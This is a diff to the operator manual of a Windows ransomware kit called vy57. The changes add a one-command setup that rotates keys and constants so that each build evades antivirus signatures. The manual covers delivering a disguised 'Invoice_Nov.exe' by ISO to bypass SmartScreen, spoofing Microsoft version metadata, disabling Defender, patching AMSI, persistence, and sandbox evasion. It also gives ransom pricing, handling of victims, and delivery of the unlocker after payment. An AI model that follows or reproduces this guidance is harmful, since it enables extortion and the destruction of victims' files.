@@ -2,7 +2,7 @@
 
 A whole-machine file locker for Windows, written as a single Python file, built unsigned with Nuitka, and operated without a C2.
 
-This README is the operator manual. It covers the build, the crypto format, the execution timeline, the evasion layer, the recovery workflow, and the parts that will bite you.
+This README is the operator manual. It covers setup, the build, the crypto format, the execution timeline, the evasion layer, the recovery workflow, and the parts that will bite you.
 
 ---
 
@@ -13,8 +13,8 @@ This README is the operator manual. It covers the build, the crypto format, the 
 3. [Repository layout](#3-repository-layout)
 4. [Requirements](#4-requirements)
 5. [Quick start](#5-quick-start)
-6. [Build](#6-build)
-7. [First-run key ceremony](#7-first-run-key-ceremony)
+6. [Setup](#6-setup)
+7. [Build](#7-build)
 8. [Configuration reference](#8-configuration-reference)
 9. [Architecture](#9-architecture)
 10. [Cryptographic specification](#10-cryptographic-specification)
@@ -50,7 +50,8 @@ This README is the operator manual. It covers the build, the crypto format, the 
 | Extension | `.<victim-id>.v57`, victim id is 6 hex chars |
 | Persistence | HKCU Run key + Startup shortcut + detached watchdog |
 | Unlocker | PowerShell, generated per victim with the master baked in |
-| Default version string | `2.1.1` |
+| Setup | one command, `--setup` |
+| Version string | `2.2.0` |
 
 ---
 
@@ -66,19 +67,32 @@ The single most important consequence: **the master key is recoverable from the 
 
 ## 3. Repository layout
 
-Source tree:
+Source tree, as shipped:
 
 ```
 vy57.py              the entire locker
-app.ico              build asset, icon
-wall.bmp             build asset, optional wallpaper
 ```
 
-Generated on the build host, never shipped to victims:
+Produced by `--setup`:
 
 ```
-vy57_priv.pem        RSA private key. THE single point of failure.
-unlock.ps1           per-victim decryptor
+app.ico              generated icon, 7 sizes
+wall.bmp             generated wallpaper
+build.bat            generated Nuitka invocation
+vy57_priv.pem        RSA private key, in the project root
+keys/                timestamped private key backups
+```
+
+Generated at build time, delivered to victims:
+
+```
+Invoice_Nov.exe      the payload
+```
+
+Generated per victim, delivered only after payment:
+
+```
+unlock.ps1           decryptor
 unlock.bat           wrapper that launches unlock.ps1
 ```
 
@@ -120,7 +134,7 @@ Ransom notes are dropped as `!!!_READ_ME_!!!.txt` and `!!!_READ_ME_!!!.html` in 
 
 - ISO container is preferred. It strips Mark-of-the-Web, which suppresses the SmartScreen "unknown publisher" prompt entirely.
 - Zip delivery works but leaves MOTW. The exe strips its own zone identifier on launch, which helps only *after* the first execution.
-- A plausible filename matters more than the icon. `Invoice_Nov.exe` is the default output name.
+- A plausible filename matters more than the icon. `Invoice_Nov.exe` is the default.
 
 ---
 
@@ -128,33 +142,8 @@ Ransom notes are dropped as `!!!_READ_ME_!!!.txt` and `!!!_READ_ME_!!!.html` in 
 
 ```bat
 pip install nuitka pycryptodome
-
-python vy57.py --gen-keys
-:: paste the PUB_B64 output into vy57.py
-:: move vy57_priv.pem somewhere that is not the victim machine
-
-python vy57.py --gen-lits
-:: paste the literal table over the literals block
-
-python vy57.py --gen-ps
-:: paste PS_XOR and PS_BLOB
-
-python vy57.py --gen-key
-:: paste KEY_XOR
-
-python -m nuitka --standalone --onefile --mingw64 ^
-  --enable-plugin=tk-inter --windows-console-mode=disable ^
-  --windows-uac-admin --windows-icon-from-ico=app.ico ^
-  --windows-company-name="Microsoft Corporation" ^
-  --windows-product-name="Windows System Cache" ^
-  --windows-file-description="Windows System Cache Service" ^
-  --windows-file-version=10.0.19041.1 ^
-  --include-data-file=wall.bmp=wall.bmp ^
-  --onefile-tempdir-spec="{CACHE_DIR}/D3DSCache" ^
-  --python-flag=no_site,no_asserts,no_docstrings ^
-  --nofollow-import-to=unittest,email,http,xml,pydoc,doctest,distutils,setuptools,pip ^
-  --include-package=Crypto --assume-yes-for-downloads ^
-  --lto=yes --output-filename=Invoice_Nov.exe vy57.py
+python vy57.py --setup
+build.bat
 ```
 
 Then on a clean VM:
@@ -164,9 +153,74 @@ Invoice_Nov.exe --list
 Invoice_Nov.exe --scope user --workers 2 --no-persist
 ```
 
+That is the whole procedure. Setup handles the keypair, the public key injection, the per-build constants, the literal table, the assets, and the build script.
+
 ---
 
-## 6. Build
+## 6. Setup
+
+`python vy57.py --setup`
+
+### 6.1 What it does
+
+In order:
+
+1. Refuses to run from a compiled exe.
+2. Verifies all four AUTO markers exist in the source.
+3. Generates a 2048-bit RSA keypair, **or reuses the existing `vy57_priv.pem`**.
+4. Copies the private key to `keys/vy57_priv_<YYYYmmdd-HHMMSS>.pem`.
+5. Rolls a fresh `PS_XOR` and `KEY_XOR`.
+6. Rewrites the `xor`, `keys`, `lits`, and `psblob` regions.
+7. Compiles the patched source with `compile()`; aborts before writing if it fails.
+8. Writes the source back atomically via a temp file and `os.replace`.
+9. Generates `app.ico` and `wall.bmp` if absent.
+10. Writes `build.bat`.
+11. Prints the key fingerprint and the next steps.
+
+### 6.2 AUTO markers
+
+Four regions of `vy57.py` are delimited like this:
+
+```python
+# ==== VY57:AUTO:BEGIN xor ====
+PS_XOR = 0x5A
+KEY_XOR = 0x37
+# ==== VY57:AUTO:END xor ====
+```
+
+The names are `xor`, `keys`, `lits`, `psblob`. Setup replaces everything between the marker pairs and nothing else. If any pair is missing or reversed, setup aborts with a message naming the region.
+
+Do not hand-edit inside the markers. Do edit anything outside them freely — setup will not touch it.
+
+### 6.3 Idempotency and rotation
+
+Re-running `--setup` keeps the keypair. It rotates the XOR constants and re-chunks the literal table, so every build is byte-distinct and a signature written against one build does not match the next. `PUB_B64` is re-derived from the same private key, so earlier victims stay decryptable.
+
+`--setup --new-keys` forces a fresh keypair. Use it only when starting a campaign you intend to keep separate from the last one.
+
+**Hazard:** if `vy57_priv.pem` is absent from the project root, setup silently creates a *new* key. Since [§17.6](#176-store-the-private-key) tells you to move the key off the machine, a casual re-run on a cleaned checkout will rotate your identity and strand every unpaid victim. Either keep a copy in the project or pass `--new-keys` deliberately.
+
+### 6.4 Why the literals change every run
+
+Hex encoding is deterministic, so a naive regenerator emits identical bytes every time and the blob becomes a stable signature. Setup splits each hex string into randomly-sized adjacent literals:
+
+```python
+SUFFIX = _s('2e76' '35' '37')
+```
+
+Python concatenates them at compile time, `_s` decodes the result, and the on-disk bytes differ on every run while the runtime value is unchanged.
+
+### 6.5 What setup does not do
+
+- It does not run Nuitka. That is `build.bat`.
+- It does not overwrite an existing `app.ico` or `wall.bmp`, so you can drop in a real icon or a proper ransom wallpaper and re-run setup without losing them.
+- It does not delete anything. `keys/` grows without bound; prune it yourself.
+
+---
+
+## 7. Build
+
+`build.bat` is generated by setup and wraps the Nuitka invocation.
 
 ### Why Nuitka and not PyInstaller
 
@@ -188,11 +242,13 @@ PyInstaller bootloaders are heavily signaturised and its onefile mode leaves an 
 | `--windows-company-name` etc. | populates the version resource; an unsigned exe with no metadata at all is more conspicuous than one with plausible metadata |
 | `--lto=yes` | slower build, smaller and slightly less pattern-matchable binary |
 
+`build.bat` also checks that `vy57.py`, `app.ico`, and `wall.bmp` exist, warns if `vy57_priv.pem` is missing, and passes any extra arguments through via `%*`.
+
 ### Things that will break the build
 
-- Missing `wall.bmp` while `--include-data-file=wall.bmp=wall.bmp` is present. Either create the file or drop the flag; the code falls back to a generated solid-colour BMP at runtime if the asset is absent.
 - `--enable-plugin=tk-inter` omitted. Tk will not be bundled and the GUI will fail at import.
 - Building on 32-bit Python. The victim-side `ctypes` calls assume 64-bit pointer widths in several places.
+- Running `build.bat` from a directory without the source. It does `cd /d "%~dp0"` first, so just run it from wherever.
 
 ### Post-build
 
@@ -206,49 +262,21 @@ Confirm no console flash and that `--list` produces per-root counts on a throwaw
 
 ---
 
-## 7. First-run key ceremony
-
-Run these once, in order, on the build host.
-
-### 7.1 `--gen-keys`
-
-Generates a 2048-bit RSA keypair. Writes `vy57_priv.pem` to the working directory and prints a base64 DER public key.
-
-**Paste the public key into `PUB_B64`.** If you leave `PUB_B64` empty the build still works but falls back to storing the master as plain base64-XOR, and the asymmetric layer is gone.
-
-Move `vy57_priv.pem` off the build host. Keep two copies in two places. If you lose it, every victim you have not already built an unlocker for becomes unrecoverable remotely (see [§21](#21-disaster-recovery)).
-
-### 7.2 `--gen-lits`
-
-Prints a fresh hex-encoded literal table. Paste it over the block between the `# literals` comment and the `# [UD] per-build XOR constants` comment.
-
-This is cosmetic-but-real: the BTC address, CLSID, both Defender policy paths, the Run key path, and the note filenames are all plainly greppable in an uncompiled binary. Regenerate per campaign so a signature for one build does not match the next.
-
-### 7.3 `--gen-ps` and `--gen-key`
-
-Same idea for the embedded PowerShell blob and the store XOR constant. Both are `[UD]` (unique data) values that should differ per build.
-
-Order matters: `--gen-ps` prints a new `PS_XOR`, so run it before `--gen-key` or you will paste a stale constant.
-
-### 7.4 Build and verify
-
-Build, then run `--list` on a VM. Confirm the log reports `pub=True`. If it says `pub=False`, your `PUB_B64` paste did not take.
-
----
-
 ## 8. Configuration reference
 
 ### 8.1 Flags
 
 | Flag | Default | Effect |
 | --- | --- | --- |
+| `--setup` | off | prepare the build, rewrite the AUTO regions |
+| `--new-keys` | off | with `--setup`, rotate the keypair |
 | `--list` | off | dry run, counts entries per root, no writes |
 | `--scope user` | `all` | limit to the profile and Public |
 | `--decrypt` | off | restore mode |
 | `--key K` | – | explicit master for `--decrypt` / `--make-unlocker` |
 | `--priv P` | `vy57_priv.pem` | private key for unwrapping |
 | `--make-unlocker` | off | build `unlock.ps1` / `unlock.bat` |
-| `--gen-keys` / `--gen-lits` / `--gen-ps` / `--gen-key` | off | build-time generators |
+| `--gen-keys` / `--gen-lits` / `--gen-ps` / `--gen-key` | off | print one region manually, no write |
 | `--sandbox M` | `auto` | `auto`, `sleep`, `exit`, `run` |
 | `--amsi` | off | AMSI patch before PowerShell |
 | `--self-delete` | off | remove the original exe after self-copy |
@@ -274,6 +302,8 @@ Build, then run `--list` on a VM. Confirm the log reports `pub=True`. If it says
 
 | Constant | Default | Notes |
 | --- | --- | --- |
+| `BUILD_NAME` | `Invoice_Nov.exe` | output filename, also written into `build.bat` |
+| `VERSION` | `2.2.0` | feeds the mutex name; bump per campaign |
 | `BASE_PRICE` | 50 | USD |
 | `DEADLINE_HOURS` | 72 | drives escalation display only |
 | `HEAD_LEN` / `TAIL_LEN` | 1 MiB | larger = slower, less plaintext exposed |
@@ -285,6 +315,8 @@ Build, then run `--list` on a VM. Confirm the log reports `pub=True`. If it says
 | `SKIP_DIR_NAMES` / `SKIP_DIR_FRAGMENTS` | see source | scope control, [§14](#14-scope-rules) |
 | `SB_USERS` / `SB_HOSTS_*` / `SB_PATHS` | see source | sandbox scoring inputs |
 
+`VERSION`, `BUILD_NAME`, and the scope lists are outside the AUTO markers and survive setup untouched.
+
 ---
 
 ## 9. Architecture
@@ -292,7 +324,7 @@ Build, then run `--list` on a VM. Confirm the log reports `pub=True`. If it says
 Single module, no packages. Sections in file order:
 
 ```
-literals          hex-encoded strings, decoded at import
+literals          hex-encoded strings behind AUTO markers, decoded at import
 logging           stdout + %LOCALAPPDATA%\VY57\vy57_debug.log
 paths             base resolution, original_exe(), note target enumeration
 dpapi             CryptProtectData / CryptUnprotectData wrappers
@@ -309,7 +341,7 @@ per-file          encrypt_file / decrypt_file
 batch             ThreadPoolExecutor driver with ramp and retry
 notes             text and HTML generation, drop, remove
 unlocker          PS1/BAT template and builder
-generators        gen_keys / gen_lits / gen_ps / gen_key
+generators        hex chunking, region patchers, asset synthesis, setup
 GUI               fullscreen Tk
 main              phase orchestration
 ```
@@ -325,7 +357,7 @@ Shared mutable state is `DONE_COUNTER` (counter lock), the queued-file check (qu
 
 ### Control flow
 
-`main()` is a linear phase list with early returns for the generator subcommands, `--list`, and `--decrypt`. The infection path is: sandbox verdict → elevation → scope → key load or create → queue → jitter → Defender → hardening → process kill → persistence → wallpaper → notes → encrypt → GUI.
+`main()` is a linear phase list with early returns for `--watch`, `--setup`, the manual generators, `--list`, and `--decrypt`. The infection path is: sandbox verdict → elevation → scope → key load or create → queue → jitter → Defender → hardening → process kill → persistence → wallpaper → notes → encrypt → GUI.
 
 ---
 
@@ -412,7 +444,7 @@ The master is held in three places:
 | --- | --- | --- |
 | `key.dat` (×2) + registry | JSON, XOR'd with `KEY_XOR`, base64'd, containing `w` (RSA-OAEP ciphertext) and `d` (DPAPI blob) | operator via `w`; victim via `d` |
 | `PUB_B64` in the binary | public key only | nobody, useless alone |
-| `vy57_priv.pem` | operator side | operator only |
+| `vy57_priv.pem` and `keys/` | operator side | operator only |
 
 `master_of()` resolves in order: DPAPI, then plaintext fallback (`P:` prefix, dev builds only), then private key.
 
@@ -420,7 +452,7 @@ The master is held in three places:
 
 - The victim cannot read the master by eyeballing `key.dat`. It is RSA ciphertext plus a DPAPI blob.
 - Re-runs, GUI validation, and local `--decrypt` all work without the private key.
-- The operator can build an unlocker from `w` and `vy57_priv.pem` alone, on any machine.
+- The operator can build an unlocker from `w` and any `keys/` backup alone, on any machine.
 
 ### What it costs
 
@@ -431,6 +463,8 @@ $b = [IO.File]::ReadAllBytes("$env:APPDATA\VY57\key.dat")
 $j = [Text.Encoding]::UTF8.GetString([byte[]]($b | % { $_ -bxor 0x37 }))
 # base64-decode, JSON-parse, base64-decode .d, CryptUnprotectData, done
 ```
+
+The `0x37` in that snippet is `KEY_XOR`, which setup rotates. Read the current value from the source.
 
 Mitigations available if this matters:
 
@@ -446,7 +480,7 @@ Mitigations available if this matters:
 | User who googles the extension | finds the note, still needs a key, pays |
 | User who reads `key.dat` and knows DPAPI | free decryption |
 | Analyst with a debugger | free decryption, plus the whole evasion layer documented |
-| Anyone with `vy57_priv.pem` | free decryption of everything |
+| Anyone with `vy57_priv.pem` or a `keys/` backup | free decryption of everything |
 
 ---
 
@@ -500,7 +534,7 @@ Each technique, and what it actually does.
 | AMSI patch (`--amsi`) | scanning of the *second* PowerShell invocation | scanning of the first, which contains the patch |
 | `-EncodedCommand` | script text in command lines, WMI command-line consumers | anyone who base64-decodes it |
 | `--no-ps` | the whole PowerShell surface | nothing, it just does less |
-| Hex-encoded literals | `strings` greps for the address, CLSID, policy paths | anyone reading the source |
+| Hex-encoded, randomly chunked literals | `strings` greps for the address, CLSID, policy paths | anyone reading the source |
 | `no_docstrings` build flag | the usage block shipping in the binary | – |
 | Version resource spoofing | metadata-based "unknown publisher with no info" heuristics | signature checks |
 | `D3DSCache` tempdir | `onefile_XXXX` extraction signatures | Nuitka bootloader detection |
@@ -509,7 +543,7 @@ Each technique, and what it actually does.
 | `--self-delete` | the obvious "run it again" artifact | – |
 | ISO delivery | SmartScreen entirely | – |
 
-**The hard truth:** none of this survives a signature written against the build. What it buys is the window between release and detection. Regenerate the `[UD]` constants per campaign and rebuild; a stale build is detected within hours.
+**The hard truth:** none of this survives a signature written against the build. What it buys is the window between release and detection. Re-run `--setup` before every campaign so the constants and literals differ; a stale build is detected within hours.
 
 **Defender specifically:** on a machine with Tamper Protection enabled, `DisableAntiSpyware` is ignored outright on 1903+, and real-time monitoring is often re-enabled at the next policy refresh. The *exclusions* are the part that reliably holds long enough for encryption to finish. Everything else is minutes.
 
@@ -542,6 +576,8 @@ Skipping `Windows` is what keeps the machine bootable. Skipping `Program Files` 
 ### Per-file filters
 
 Extension in `SKIP_EXTENSIONS`, name in `SKIP_NAMES`, symlinks, size over `MAX_SIZE`, files already carrying the magic header, files whose `.v57` sibling exists.
+
+`SKIP_NAMES` covers `app.ico`, `build.bat`, `vy57.py`, `key.dat`, `wall.bmp`, and the note filenames, so a build directory that gets encrypted in place stays recoverable.
 
 ### Making it scarier
 
@@ -596,7 +632,7 @@ The HTML is auto-opened via the default browser unless `--no-open`.
 
 ### Wallpaper
 
-Replaced with `wall.bmp` from the build directory, or a generated solid near-black BMP with blue edges if the asset is missing. The original path is captured into the key store *before* replacement and restored on decrypt.
+Replaced with `wall.bmp` from the build directory — generated by setup, or your own if you supplied one — or a synthesised solid BMP if the asset is missing. The original path is captured into the key store *before* replacement and restored on decrypt.
 
 ### Price escalation
 
@@ -623,29 +659,39 @@ If they reinstalled over the top, the DPAPI blob is gone and only `--priv` works
 
 Quote the price from the note. Do not discount below `$50`. Accept overpayment.
 
-### 17.3 Build the unlocker
+### 17.3 Match the key
 
-On the build host, with the key store in place and `vy57_priv.pem` available:
+Every setup run stamps a key fingerprint. Match the victim's build to a fingerprint, then use the corresponding `keys/vy57_priv_<stamp>.pem`. If you cannot identify which build a victim ran, try each key in turn — `--make-unlocker` fails loudly on a mismatch and does not write anything.
+
+### 17.4 Build the unlocker
+
+On the build host, with the victim's key store in place:
 
 ```bat
-Invoice_Nov.exe --make-unlocker --priv vy57_priv.pem
+Invoice_Nov.exe --make-unlocker --priv keys\vy57_priv_20260101-120000.pem
 ```
 
 This reads the store, unwraps the master, and writes `unlock.ps1` and `unlock.bat` into the working directory. It prints the plaintext master and the roots to the console — keep that output, it is your only backup if the victim's `d` blob is gone.
 
 `--key K` works instead of `--priv` if you already have the master.
 
-### 17.4 Deliver
+### 17.5 Deliver
 
 Send **both** files. Tell the victim to save them to the same folder, for example `Downloads`, and double-click `unlock.bat`.
 
 They will need `-ExecutionPolicy Bypass` to be reachable, which the BAT supplies. If their policy blocks it anyway, the fallback is the CLI route in [§18.3](#183-cli).
 
-### 17.5 Verify
+### 17.6 Store the private key
+
+`keys/` is the only thing standing between you and unrecoverable victims. Sync it off the machine before every campaign and keep two copies in two places.
+
+Note the hazard from [§6.3](#63-idempotency-and-rotation): if `vy57_priv.pem` is gone from the project root and you re-run setup, you get a new identity.
+
+### 17.7 Verify
 
 Ask for a screenshot of the `Restored: N    Failed: M` summary. `Failed` above zero means files that were locked during encryption, corrupted, or larger than the cap. Walk them through re-running for the failures.
 
-### 17.6 Close
+### 17.8 Close
 
 Have them run:
 
@@ -695,6 +741,10 @@ Invoice_Nov.exe --decrypt                     :: uses the DPAPI blob
 
 | Symptom | Cause | Fix |
 | --- | --- | --- |
+| `AUTO marker "x" missing` | marker pair edited or deleted | restore from git or the last build |
+| `patched source does not compile` | a generator emitted bad syntax | nothing was written; report the exact error |
+| `run --setup from the .py source` | ran setup on the built exe | run `python vy57.py --setup` |
+| `PUB_B64` changed unexpectedly | pem was absent, setup generated a new key | copy the matching pem from `keys/` and re-run |
 | `0 file(s) queued` on a machine that clearly has files | everything already encrypted, or wrong scope, or `MAX_SIZE` | check `--list` output; confirm `--scope all` |
 | `quiet: nothing to do` on every login | nothing new, working as intended | – |
 | GUI never appears after reboot | Run key or Startup shortcut removed | re-run the exe manually |
@@ -709,7 +759,7 @@ Invoice_Nov.exe --decrypt                     :: uses the DPAPI blob
 | Wallpaper not restored | original path gone | set it manually |
 | Files end in `.v57.v57` | v2.0 and earlier watcher race | decrypt twice, oldest extension first |
 | `powershell failed` in the log | policy or AMSI blocking | retry with `--no-ps`, exclusions still apply |
-| Build fails at `--include-data-file` | `wall.bmp` missing | create the file or drop the flag |
+| `missing app.ico - run setup again` | assets deleted after setup | re-run `--setup`; existing assets are preserved |
 | GUI opens but encryption is stuck at 0 | permissions on the profile root | check `--scope user` works |
 
 ---
@@ -719,26 +769,34 @@ Invoice_Nov.exe --decrypt                     :: uses the DPAPI blob
 Ordered roughly by how much they should worry you.
 
 1. **DPAPI makes local recovery free.** [§11](#11-key-storage-and-threat-model).
-2. **No C2.** No live pricing, no beacon, no per-victim key server, no telemetry.
-3. **The price escalation is fake.** Nothing enforces it.
-4. **Intermittent mode leaves plaintext middles.** Large media and archives are partly recoverable.
-5. **The middle is unauthenticated.** Silent corruption there decrypts "successfully".
-6. **Windows and Program Files are untouched.** The machine still boots and most apps still launch, which makes the infection look less total than it is.
-7. **No VSS on non-admin runs.** If UAC is declined, shadow copies survive and the whole job is undone by a single `vssadmin` restore.
-8. **Nuitka onefile is itself a heuristic.** The extraction step is detectable.
-9. **Tamper Protection reverts Defender changes.** Exclusions usually survive; real-time state does not.
-10. **No file-content classification.** It encrypts `.iso`, `.vmdk`, and `.bak` with the same enthusiasm as documents.
-11. **OneDrive placeholder hydration.** Cloud-only files get pulled down on open, which can stall the walk on large accounts.
-12. **No network shares.** Mapped letters are covered because they answer `isdir`; UNC paths are not enumerated.
-13. **Tk fullscreen clips on displays under 1100×700.**
-14. **The unlocker holds whole files in memory.** A 2 GB file needs 2 GB of RAM on the victim machine.
-15. **`--self-delete` is best-effort.** It can fail if the exe is still mapped elsewhere.
+2. **Setup regenerates the keypair if the pem is missing.** Move the key, forget to keep a copy, re-run setup, and you have a new identity. [§6.3](#63-idempotency-and-rotation).
+3. **No C2.** No live pricing, no beacon, no per-victim key server, no telemetry.
+4. **The price escalation is fake.** Nothing enforces it.
+5. **Intermittent mode leaves plaintext middles.** Large media and archives are partly recoverable.
+6. **The middle is unauthenticated.** Silent corruption there decrypts "successfully".
+7. **Windows and Program Files are untouched.** The machine still boots and most apps still launch, which makes the infection look less total than it is.
+8. **No VSS on non-admin runs.** If UAC is declined, shadow copies survive and the whole job is undone by a single `vssadmin` restore.
+9. **Setup rewrites its own file.** In a git repo that is a few hundred changed hex characters per run; commit first.
+10. **The AUTO markers are load-bearing.** Delete a pair and setup refuses to run.
+11. **Nuitka onefile is itself a heuristic.** The extraction step is detectable.
+12. **Tamper Protection reverts Defender changes.** Exclusions usually survive; real-time state does not.
+13. **No file-content classification.** It encrypts `.iso`, `.vmdk`, and `.bak` with the same enthusiasm as documents.
+14. **OneDrive placeholder hydration.** Cloud-only files get pulled down on open, which can stall the walk on large accounts.
+15. **No network shares.** Mapped letters are covered because they answer `isdir`; UNC paths are not enumerated.
+16. **Tk fullscreen clips on displays under 1100×700.**
+17. **The unlocker holds whole files in memory.** A 2 GB file needs 2 GB of RAM on the victim machine.
+18. **`--self-delete` is best-effort.** It can fail if the exe is still mapped elsewhere.
+19. **`keys/` grows without bound.** One private key per setup run, never pruned.
 
 ---
 
 ## 21. Disaster recovery
 
-### Lost `vy57_priv.pem`
+### Lost `vy57_priv.pem` but still have `keys/`
+
+Nothing is lost. Any timestamped backup in `keys/` works identically with `--make-unlocker --priv`.
+
+### Lost `keys/` and `vy57_priv.pem`
 
 Every victim whose machine still has a valid DPAPI blob is still recoverable — run `--decrypt` **on the victim machine** and it resolves through DPAPI with no key. Victims whose profile was recreated are gone.
 
@@ -766,12 +824,26 @@ The backup contains plaintext. Anything created after the backup is encrypted. N
 
 Run on a disposable VM before every campaign.
 
-- [ ] `--list` returns plausible per-root counts
-- [ ] `--gen-keys` produces a key and prints a public key
-- [ ] `PUB_B64` pasted; log shows `pub=True`
-- [ ] `--gen-lits`, `--gen-ps`, `--gen-key` all applied and the file still imports
-- [ ] Build completes with no warnings about missing assets
+**Setup**
+
+- [ ] Fresh clone: `--setup` produces a keypair, assets, and `build.bat`
+- [ ] `PUB_B64` in the file is valid base64 DER and parses with `RSA.import_key`
+- [ ] Second `--setup` keeps `PUB_B64` identical and changes `PS_XOR`, `KEY_XOR`, and the literal bytes
+- [ ] `--setup --new-keys` does change `PUB_B64`
+- [ ] Deleting a marker pair makes setup abort cleanly
+- [ ] `keys/` contains one timestamped backup per run
+- [ ] Existing `app.ico` / `wall.bmp` survive a re-run
+- [ ] `python -c "import vy57"` succeeds after setup
+
+**Build**
+
+- [ ] `build.bat` completes with no warnings
 - [ ] Version resource present in the built exe
+- [ ] No console window on launch
+
+**Runtime**
+
+- [ ] `--list` returns plausible per-root counts
 - [ ] `--scope user --workers 2 --no-persist` completes on a seeded profile
 - [ ] A 6 MiB file is intermittent; check the middle is intact with a hex editor
 - [ ] `--full` produces a fully encrypted file
@@ -859,6 +931,16 @@ Usage: `python refdec.py <master> <directory>`
 ---
 
 ## Appendix B: changelog
+
+**2.2.0**
+
+- `--setup`: one command generates the keypair, injects the public key, rolls the XOR constants, rebuilds the literal table and PS blob, generates `app.ico` and `wall.bmp`, and writes `build.bat`
+- Source is patched between `VY57:AUTO` markers and `compile()`-checked before being written
+- Literals are emitted as randomly chunked adjacent strings so the on-disk bytes differ per run
+- Private key backed up to `keys/` on every setup run
+- Fixed `PUB_B64 = PUB_B64 = (` doubled assignment
+- Manual generators reduced to printers; setup is the only writer
+- `app.ico` and `build.bat` added to `SKIP_NAMES`
 
 **2.1.1**
 
